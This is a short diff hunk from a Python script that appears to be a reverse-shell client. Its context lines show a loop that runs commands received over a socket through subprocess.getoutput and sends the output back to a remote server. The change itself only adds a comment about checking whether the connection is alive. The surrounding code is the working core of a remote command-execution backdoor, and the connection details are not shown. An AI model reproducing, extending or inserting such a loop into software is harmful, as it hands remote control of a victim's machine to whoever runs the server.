@@ -25,5 +25,7 @@ while True:
     output = subprocess.getoutput(command)
     # send the results back to the server
     s.send(output.encode())
+    
+    # Check if the connection is still alive passively, if not alive then quit
 # close client connection
 s.close()
